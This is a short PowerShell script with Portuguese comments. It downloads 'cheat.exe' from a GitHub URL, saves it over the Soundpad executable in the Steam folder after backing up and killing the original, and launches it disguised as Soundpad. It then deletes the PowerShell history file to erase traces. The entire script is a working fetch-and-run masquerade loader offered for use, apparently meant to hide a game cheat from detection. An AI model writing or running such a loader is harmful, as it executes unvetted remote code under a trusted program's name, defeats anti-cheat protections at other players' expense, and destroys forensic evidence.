# 1. CONFIGURAÇÕES
$CheatUrl = "https://raw.githubusercontent.com/enzin762/wasd/main/cheat.exe" # Seu cheat compilado como EXE
$SoundpadPath = "C:\Program Files (x86 )\Steam\steamapps\common\Soundpad\Soundpad.exe"
$BackupPath = "C:\Program Files (x86)\Steam\steamapps\common\Soundpad\Soundpad_original.exe"

# 2. LOCALIZAR PASTA (Caso não seja a padrão)
if (-not (Test-Path $SoundpadPath)) {
    $SteamPath = Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue
    $SoundpadPath = "$($SteamPath.InstallPath)\steamapps\common\Soundpad\Soundpad.exe"
    $BackupPath = (Split-Path $SoundpadPath) + "\Soundpad_original.exe"
}

Write-Host "[+] Preparando camuflagem..." -ForegroundColor Cyan

# 3. REALIZAR A TROCA
Stop-Process -Name "Soundpad" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

# Se ainda não houver backup, cria um do original
if (-not (Test-Path $BackupPath)) {
    Move-Item $SoundpadPath $BackupPath -Force
}

# Baixa o seu cheat com o nome do Soundpad
Invoke-WebRequest -Uri $CheatUrl -OutFile $SoundpadPath -UseBasicParsing

# 4. INICIAR
Write-Host "[+] Iniciando Soundpad camuflado..." -ForegroundColor Green
Start-Process $SoundpadPath

# Limpar rastros do PowerShell
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
Write-Host "[OK] Sucesso!" -ForegroundColor Cyan
